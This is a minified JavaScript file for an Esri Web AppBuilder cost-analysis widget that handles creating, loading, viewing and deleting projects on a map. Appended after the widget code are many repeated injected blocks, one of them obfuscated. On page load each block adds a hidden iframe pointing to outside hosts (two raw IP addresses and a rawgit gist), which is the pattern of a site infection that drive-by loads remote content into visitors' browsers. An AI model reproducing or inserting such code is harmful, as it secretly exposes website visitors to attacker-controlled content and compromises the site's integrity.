// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/create-load-project.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"esriCTCreateProjectContainer" data-dojo-attach-point\x3d"createLoadProjectContainer"\x3e\x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"createProjectContainer"\x3e\x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"loadProjectContainer"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./create-load-project.html dojo/_base/lang dojo/_base/array dojo/on dojo/dom-construct ./item-list dijit/form/ValidationTextBox dijit/form/Select esri/tasks/query esri/graphic esri/tasks/QueryTask esri/graphicsUtils dojo/Deferred esri/layers/FeatureLayer dojo/promise/all jimu/dijit/Message".split(" "),function(w,x,y,z,A,e,h,p,k,B,r,C,m,D,n,t,l,u,q,v){return w([x,y,z],{templateString:A,baseClass:"jimu-widget-cost-analysis-create-load-project",
highlighterColor:"#000",projectLayer:null,paneListData:[],_numberFieldTypes:["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"],projectNameOptions:[],projectNameField:null,projectDescField:null,postCreate:function(){this.inherited(arguments);this.projectNameField=this.config.projectLayerFields.PROJECTNAME;this.projectDescField=this.config.projectLayerFields.DESCRIPTION;this.paneListData=[];this.projectLayer=this.layerInfosObj.getLayerInfoById(this.config.projectSettings.projectLayer).layerObject;
this.projectNameOptions=[{label:this.nls.createLoadProject.selectProject,value:""}];this._createProjectUI();this._loadProjectUI()},startup:function(){this.inherited(arguments);this.paneListData=[{title:this.nls.createLoadProject.createProjectPaneTitle,content:this.createProjectContainer,isOpen:!0},{title:this.nls.createLoadProject.loadProjectPaneTitle,content:this.loadProjectContainer,isOpen:!1}];this._createAndLoadProjectPanes();this._getProjectNamesOptions()},_showMessage:function(b){(new v({message:b})).message=
b},_createProjectUI:function(){var b,a,c,d,f;b=k.create("div",{"class":"esriCTCreateProjectWrapper"},this.createProjectContainer);a=k.create("div",{"class":"esriCTFullwidth esriCTCreateProjectContent"},b);c=new r({required:!0,trim:!0,placeHolder:this.nls.createLoadProject.projectNamePlaceHolder,title:this.nls.createLoadProject.projectNamePlaceHolder,maxLength:this._getFieldInfo(this.projectNameField).fieldLength,autofocus:!0,"class":"esriCTFullwidth esriCTCreateProjectContent esriCTEllipsis"},a);
c.validator=e.hitch(this,function(a){return""===a?!1:this._validateProjectNameLocally(a)?!0:(c.set("state","Error"),c.set("invalidMessage",this.nls.createLoadProject.errorDuplicateProjectName),!1)});f=this._getFieldInfo(this.projectDescField);a=k.create("div",{"class":"esriCTFullwidth esriCTCreateProjectContent"},b);d=new r({required:f.nullable,trim:!0,placeHolder:this.nls.createLoadProject.projectDescPlaceHolder,"class":"esriCTFullwidth esriCTCreateProjectContent esriCTEllipsis",title:this.nls.createLoadProject.projectDescPlaceHolder,
maxLength:f.fieldLength},a);b=k.create("div",{"class":"esriCTFullwidth esriCTCreateLoadButtonWrap"},b);b=this._createButton(this.nls.createLoadProject.createLabel,b);this.own(p(b,"click",e.hitch(this,function(){d.isValid()||(d.set("state","Error"),d.set("message",d.getErrorMessage()));c.isValid()&&d.isValid()&&(this.loadingIndicator.show(),this._validateForDuplicateProjectName(c.get("value")).then(e.hitch(this,function(a){a?(this.loadingIndicator.hide(),c.set("state","Error"),this._showMessage(this.nls.createLoadProject.errorDuplicateProjectName)):
this._addProjectToLayer(c.get("value"),d.get("value")).then(e.hitch(this,function(a){var b;this.loadingIndicator.hide();a&&a.success&&a.globalId?(b={label:c.get("value"),value:a.globalId,descValue:d.get("value"),globalIdValue:a.globalId,objectIdValue:a.objectId},this.projectNameSelect.addOption(b),this.emit("createProject",{name:c.get("value"),desc:d.get("value"),projectId:a.globalId,objectId:a.objectId}),c.set("value"," "),d.set("value","")):this._showMessage(this.nls.createLoadProject.errorInCreatingProject)}),
e.hitch(this,function(){this.loadingIndicator.hide();this._showMessage(this.nls.createLoadProject.errorInCreatingProject)}))}),e.hitch(this,function(){this.loadingIndicator.hide();this._showMessage(this.nls.createLoadProject.errorInCreatingProject)})))})));return this.createProjectContainer},_getFieldInfo:function(b){var a,c;this.projectLayer&&this.projectLayer.getField(b)&&(b=this.projectLayer.getField(b),a=b.length,c=!b.nullable);return{fieldLength:a,nullable:c}},_createButton:function(b,a){return k.create("div",
{"class":"jimu-btn esriCTEllipsis",innerHTML:b,title:b},a)},_loadProjectUI:function(){var b,a;b=k.create("div",{"class":"esriCTLoadProjectWrapper"},this.loadProjectContainer);a=k.create("div",{"class":"esriCTFullwidth esriCTCreateProjectContent"},b);b=k.create("div",{"class":"esriCTFullwidth esriCTCreateLoadButtonWrap"},b);this.projectNameSelect=new C({"class":"esriCTFullwidth",options:this.projectNameOptions},k.create("div",{},a));this.projectNameSelect.startup();a=this._createButton(this.nls.createLoadProject.viewInMapLabel,
b);this.own(p(a,"click",e.hitch(this,function(){this.getProjectAssets("ViewProject")})));a=this._createButton(this.nls.common.deleteText,b);this.own(p(a,"click",e.hitch(this,this._deleteBtnClicked)));b=this._createButton(this.nls.createLoadProject.loadLabel,b);this.own(p(b,"click",e.hitch(this,function(){this.getProjectAssets("LoadProject")})));return this.loadProjectContainer},_deleteBtnClicked:function(){var b,a;(a=this.projectNameSelect._getSelectedOptionsAttr())&&a.value?b=new v({message:this.nls.createLoadProject.deleteProjectConfirmationMsg,
type:"question",maxWidth:375,buttons:[{label:this.nls.common.yes,onClick:e.hitch(this,function(){b.close();this.getProjectAssets("DeleteProject")})},{label:this.nls.common.no,onClick:e.hitch(this,function(){b.close()})}]}):this._showMessage(this.nls.createLoadProject.errorProjectNotSelected)},_checkIfProjectExist:function(b){var a,c,d;d=new l;c=new n(this.projectLayer.url);a=new m;a.outFields=[this.projectLayer.objectIdField,this.projectLayer.globalIdField];a.returnGeometry=!1;a.where=this.projectLayer.globalIdField+
" \x3d '"+b+"'";c.execute(a,e.hitch(this,function(a){a&&a.features&&0<a.features.length?d.resolve(!0):d.resolve(!1)}),e.hitch(this,function(){d.resolve(!1)}));return d.promise},getProjectAssets:function(b){var a,c,d,f,g;(g=this.projectNameSelect._getSelectedOptionsAttr())&&g.value?(this.loadingIndicator.show(),this._checkIfProjectExist(g.globalIdValue).then(e.hitch(this,function(E){E?(d=this.layerInfosObj.getTableInfoById(this.config.projectSettings.assetTable).layerObject,f=new u(d.url),c=new n(f.url),
a=new m,a.outFields=["*"],a.returnGeometry=!1,a.where=this.config.assetTableFields.PROJECTGUID+" \x3d '"+g.globalIdValue+"'",c.execute(a,e.hitch(this,function(a){this.loadingIndicator.hide();"ViewProject"===b?this._showProjectOnMap(g,a.features):"DeleteProject"===b?this._deleteProject(g,a.features):this._createAssetTemplateInfo(g,a.features)}),e.hitch(this,function(){this._showMessage(this.nls.createLoadProject.errorInLoadingProject);this.loadingIndicator.hide()}))):(this.projectNameSelect.removeOption(g.globalIdValue),
this._showMessage(this.nls.createLoadProject.errorProjectNotFound),this.emit("showCreateLoadPrjPanel"),this.loadingIndicator.hide())}),e.hitch(this,function(){this._showMessage(this.nls.createLoadProject.errorInLoadingProject);this.emit("showCreateLoadPrjPanel");this.loadingIndicator.hide()}))):this._showMessage(this.nls.createLoadProject.errorProjectNotSelected)},_createAssetTemplateInfo:function(b,a){var c=[];this.loadingIndicator.show();h.forEach(a,e.hitch(this,function(a){(a=a.attributes[this.config.assetTableFields.GEOGRAPHYGUID])&&
c.push(a)}));this._getRegionName(c).then(e.hitch(this,function(c){this.loadingIndicator.hide();var d,g;d=[];g={};h.forEach(a,e.hitch(this,function(a){var b,e={},f;b=a.attributes[this.config.assetTableFields.ASSETGUID];f=a.attributes[this.config.assetTableFields.GEOGRAPHYGUID];d.push(b);e.COSTEQUATION=a.attributes[this.config.assetTableFields.COSTEQUATION];e.SCENARIO=a.attributes[this.config.assetTableFields.SCENARIO];e.TEMPLATENAME=a.attributes[this.config.assetTableFields.TEMPLATENAME];e.GEOGRAPHYGUID=
f;e.GEOGRAPHY=f?c[f]:null;e.OBJECTID=a.attributes[this.config.assetTableFields.OBJECTID];g[b]=e}));this._loadProject(b,d,g)}),e.hitch(this,function(){this.loadingIndicator.hide()}))},_getAssetRequestToLayer:function(b,a){var c,d,f,g;g=a.layerObject.id;f=a.layerObject;f.clearSelection();d=new l;a=new n(f.url);c=new m;c.outFields=["*"];c.returnGeometry=!0;c.outSpatialReference=this.map.spatialReference;c.where=f.globalIdField+" in ('"+b.join("','")+"')";a.execute(c,e.hitch(this,function(a){a&&a.features&&
0<a.features.length?d.resolve({layerId:g,features:a.features}):d.resolve({layerId:g,features:[]})}),e.hitch(this,function(){d.resolve({layerId:g,features:[]})}));return d.promise},_getProjectAdditionalCost:function(b){var a,c,d;a=new l;(c=this.config.projectSettings.multiplierAdditionalCostTable)?(c=this.layerInfosObj.getTableInfoById(c).layerObject.url,d=new n(c),c=new m,c.outFields=["*"],c.returnGeometry=!1,c.where=this.config.projectMultiplierFields.PROJECTGUID+" \x3d '"+b+"'",d.execute(c,e.hitch(this,
function(b){var c=[];b&&b.features&&(c=b.features);a.resolve(c)}),e.hitch(this,function(){a.resolve([])}))):a.resolve([]);return a.promise},_getRegionName:function(b){var a,c,d,f;a=new l;this.config.projectSettings.costingGeometryLayer&&this.config.projectSettings.geographyField&&0<b.length?(f=this.layerInfosObj.getLayerInfoById(this.config.projectSettings.costingGeometryLayer).layerObject,d=new n(f.url),c=new m,c.outFields=[this.config.projectSettings.geographyField,f.globalIdField],c.returnDistinctValues=
!0,c.returnGeometry=!1,c.where=f.globalIdField+" in ('"+b.join("','")+"')",d.execute(c,e.hitch(this,function(b){var c={};b&&b.features&&h.forEach(b.features,e.hitch(this,function(a){c[a.attributes[f.globalIdField]]=a.attributes[this.config.projectSettings.geographyField]}));a.resolve(c)}),e.hitch(this,function(){a.resolve([])}))):a.resolve([]);return a.promise},_selectFeaturesOnMap:function(b,a){var c,d;d=this.layerInfosObj.getLayerInfoById(a).layerObject;c=new l;a=new m;a.where=d.globalIdField+" in ('"+
b.join("','")+"')";d.selectFeatures(a,u.SELECTION_NEW,e.hitch(this,function(a){a&&0<a.length?c.resolve(a):c.resolve([])}),e.hitch(this,function(){c.resolve([])}));return c.promise},_showProjectOnMap:function(b,a){var c=[],d=[];h.forEach(a,e.hitch(this,function(a){c.push(a.attributes[this.config.assetTableFields.ASSETGUID])}));0===c.length?this._showMessage(this.nls.createLoadProject.noAssetsToViewOnMap):(this.loadingIndicator.show(),this._selectFeaturesOnMap([b.globalIdValue],this.config.projectSettings.projectLayer).then(e.hitch(this,
function(a){var b=!1;0<a.length&&a[0].geometry&&(b=!0,this.map.setExtent(t.graphicsExtent(a).expand(1.5)));h.forEach(this.config.layerSettings,e.hitch(this,function(a){a.editable&&d.push(this._selectFeaturesOnMap(c,a.id))}));q(d).then(e.hitch(this,function(a){var c=[];this.loadingIndicator.hide();b||(h.forEach(a,e.hitch(this,function(a){c=c.concat(a)})),0<c.length?this.map.setExtent(t.graphicsExtent(c).expand(1.5)):this._showMessage(this.nls.createLoadProject.noAssetsToViewOnMap))}))}),e.hitch(this,
function(){this.loadingIndicator.hide();this._showMessage(this.nls.createLoadProject.errorInLoadingProject)})))},_deleteFromTable:function(b,a,c){if(b=this.layerInfosObj.getTableInfoById(b))b=b.layerObject;a=a+" \x3d '"+c+"'";b?a=this.appUtils.deleteFeatures(b.url,a):(a=new l,a.resolve(!1),a=a.promise);return a},_deleteProject:function(b,a){var c=[],d,f=[];d=b.globalIdValue;this.loadingIndicator.show();h.forEach(a,e.hitch(this,function(a){c.push(a.attributes[this.config.assetTableFields.ASSETGUID])}));
0<c.length&&h.forEach(this.config.layerSettings,e.hitch(this,function(a){var b;a.editable&&(a=this.layerInfosObj.getLayerInfoById(a.id).layerObject,b=a.globalIdField+" in ('"+c.join("','")+"')",f.push(this.appUtils.deleteFeatures(a.url,b)))}));f.push(this._deleteFromTable(this.config.projectSettings.assetTable,this.config.assetTableFields.PROJECTGUID,d));f.push(this._deleteFromTable(this.config.projectSettings.multiplierAdditionalCostTable,this.config.projectMultiplierFields.PROJECTGUID,d));f.push(this.appUtils.deleteFeatures(this.projectLayer.url,
this.projectLayer.globalIdField+" \x3d '"+b.globalIdValue+"'"));q(f).then(e.hitch(this,function(){this.loadingIndicator.hide();this.projectNameSelect.removeOption(d);this._showMessage(this.nls.createLoadProject.projectDeletedMsg);this.projectLayer.clearSelection();this.projectLayer.refresh();h.forEach(this.config.layerSettings,e.hitch(this,function(a){a.editable&&(a=this.layerInfosObj.getLayerInfoById(a.id).layerObject,a.clearSelection(),a.refresh())}))}))},_loadProject:function(b,a,c){var d=[];this.loadingIndicator.show();
if(0<a.length)h.forEach(this.config.layerSettings,e.hitch(this,function(b){var c=this.layerInfosObj.getLayerInfoById(b.id);c&&c.layerObject&&b.editable&&d.push(this._getAssetRequestToLayer(a,c))}));else{var f=new l;d.push(f.promise);f.resolve(null)}q(d).then(e.hitch(this,function(a){var d={},f;f={name:b.label,desc:b.descValue,projectId:b.globalIdValue,objectId:b.objectIdValue};h.forEach(a,e.hitch(this,function(a){a&&(d[a.layerId]=a.features)}));this._getProjectAdditionalCost(b.globalIdValue).then(e.hitch(this,
function(a){this.loadingIndicator.hide();this.emit("loadProject",{assetTemplateInfo:c,assetInfo:d,projectInfo:f,additionalCostInfo:a})}),e.hitch(this,function(){this.loadingIndicator.hide()}))}),e.hitch(this,function(){this.loadingIndicator.hide()}))},_createAndLoadProjectPanes:function(){this.paneListData&&0<this.paneListData.length&&(this._createOrLoadPrj=new B({itemList:this.paneListData,openMultiple:!1,highlighterColor:this.config.selectedThemeColor},k.create("div",{},this.createLoadProjectContainer)),
this._createOrLoadPrj.startup())},_getProjectNamesOptions:function(){var b,a;this.loadingIndicator.show();a=new n(this.projectLayer.url);b=new m;b.outFields=[this.projectNameField,this.projectDescField,this.projectLayer.objectIdField,this.projectLayer.globalIdField];b.returnGeometry=!1;b.where="1\x3d1";a.execute(b,e.hitch(this,function(a){var b=[];a&&a.features&&(b=a.features);this._populateProjectNameOptions(b)}),e.hitch(this,function(){this.loadingIndicator.hide()}))},_populateProjectNameOptions:function(b){this.projectNameOptions=
[{label:this.nls.createLoadProject.selectProject,value:""}];h.forEach(b,e.hitch(this,function(a){this.projectNameField&&a.attributes[this.projectNameField]&&""!==e.trim(a.attributes[this.projectNameField])&&this.projectNameOptions.push({label:a.attributes[this.projectNameField],value:a.attributes[this.projectLayer.globalIdField],descValue:a.attributes[this.projectDescField],globalIdValue:a.attributes[this.projectLayer.globalIdField],objectIdValue:a.attributes[this.projectLayer.objectIdField]})}));
this.projectNameSelect.set("options",e.clone(this.projectNameOptions));this.loadingIndicator.hide()},_validateProjectNameLocally:function(b){return 0<h.filter(this.projectNameOptions,function(a){return a.label.toUpperCase()===b.toUpperCase()}).length?!1:!0},_validateForDuplicateProjectName:function(b){var a,c,d;d=new l;c=new n(this.projectLayer.url);a=new m;a.outFields=[this.projectLayer.objectIdField,this.projectLayer.globalIdField];a.returnGeometry=!1;a.where="UPPER("+this.projectNameField+") \x3d '"+
b.toUpperCase()+"'";c.execute(a,e.hitch(this,function(a){a&&a.features&&0<a.features.length?d.resolve(!0):d.resolve(!1)}),e.hitch(this,function(){d.resolve(!1)}));return d.promise},_addProjectToLayer:function(b,a){var c,d;c=new l;d=new D;d.attributes=0<this.projectLayer.templates.length?this.projectLayer.templates[0].prototype.attributes:this.projectLayer.types[0].templates[0].prototype.attributes;d.attributes[this.projectNameField]=b;d.attributes[this.projectDescField]=a;this.projectLayer.applyEdits([d],
null,null,e.hitch(this,function(a){c.resolve(a[0])}),function(a){c.reject(a)});return c.promise}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});